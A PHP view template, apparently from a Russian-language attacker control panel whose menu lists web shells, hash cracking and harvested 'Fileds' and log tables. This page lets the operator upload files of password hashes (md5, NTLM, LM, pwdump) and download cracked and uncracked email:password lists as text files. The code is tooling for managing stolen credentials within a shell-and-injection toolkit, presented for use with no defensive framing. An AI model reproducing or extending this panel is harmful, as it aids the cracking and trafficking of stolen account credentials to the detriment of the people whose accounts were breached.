<?
if(isset($cmd)){

	if($cmd=="down"){
		header("Content-Description: File Transfer\r\n");
		header("Pragma: public\r\n");
		header("Expires: 0\r\n");
		header("Cache-Control: must-revalidate, post-check=0, pre-check=0\r\n");
		header("Cache-Control: public\r\n");
		header("Content-Type: text/plain; charset=UTF-8\r\n");
		header("Content-Disposition: attachment; filename=\"hash.txt\"\r\n");
		ob_end_clean();
		foreach ($shag4 as $val){
			if($val['hash']['pass']!="no"){
				echo $val['hash']['mail'].":".$val['hash']['pass']."\n";
			}
		}
		exit;
	}
	
	if($cmd=="down2"){
		header("Content-Description: File Transfer\r\n");
		header("Pragma: public\r\n");
		header("Expires: 0\r\n");
		header("Cache-Control: must-revalidate, post-check=0, pre-check=0\r\n");
		header("Cache-Control: public\r\n");
		header("Content-Type: text/plain; charset=UTF-8\r\n");
		header("Content-Disposition: attachment; filename=\"nohash.txt\"\r\n");
		ob_end_clean();
		foreach ($shag4 as $val){
			if($val['hash']['pass']=="no"){
				echo $val['hash']['mail'].":".$val['hash']['hash']."\n";
			}
		}
		exit;
	}

}else{
?>
	<!-- START CONTENT -->
	<div id="content">
	
		<div class="clear center"><?=(!empty($delete_msg))? $delete_msg."<br/>": ""?></div>
		
		<ul class="page-nav fl">
			<li ><?=$html->link('Шеллы',array('action'=>'shelltest2')); ?></li>
			<li class="active"><?=$html->link('Расхеширование',array('action'=>'hash')); ?></li>
			<li><?=$html->link('Настройки',array('action'=>'settings')); ?></li>
			<li><?=$html->link('Таблица Fileds',array('action'=>'squleview')); ?></li>
			<li><?=$html->link('Таблица Logs',array('action'=>'table_logs')); ?></li>
			<li><?=$html->link('Таблица Multi',array('action'=>'table_multi')); ?></li>
		</ul>

		<?=$form->create('Post')?>
			<?=$form->submit('очистить', array('name'=>'delete','class'=>'btn_simple btn_red page_btn fr','div'=>false, 'onclick'=>'if(!confirm("Все будет удалено. Продолжить?")){return false;}'))?>
		<?=$form->end()?>
		
		<div class="clear"></div>
		<table class="table">
			<thead>
				<th class="center">Расхэшированные</th><th class="center">Хешированные</th>
			</thead>
			<tbody>
				<tr>
					<? if(isset($hash_yes) && intval($hash_yes) >0){ ?>
						<td width="50%"><?=$html->link('Скачать',array('action'=>'hash/down'),array('class'=>'btn btn_green')); ?> - <?=$hash_yes?> шт.</td>
					<?}else{?>
						<td width="50%" class="center">Пусто</td>
					<?}?>
					
					<? if(isset($hash_no) && intval($hash_no) >0){ ?>
						<td width="50%"><?=$html->link('Скачать',array('action'=>'hash/down2'),array('class'=>'btn btn_green')); ?> - <?=$hash_no?> шт.</td>
					<?}else{?>
						<td width="50%" class="center">Пусто</td>
					<?}?>
					
					
				</tr>
			</tbody>
		</table>

		<div class="page-block">
			<label for="hash">Укажите путь к файлу с паролями:</label>
			<?=$form->create('Post',array('type'=>'file'))?>
			<?=$form->input('mails',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
			<?=$form->submit('Запустить', array('class'=>'btn btn_green','div'=>false))?>
			<?=$form->end()?>
		</div>
		<br/>
		<span class="comment red">Допустимый формат хэшей: md5(), md5(md5()), ntlm(), lm(), pwdump()</span><br/>
		<span class="comment">Файл должен быть сохранен в кодировке UTF-8</span>
		<br/><br/>

	</div>
	<!-- STOP CONTENT -->
<? } ?>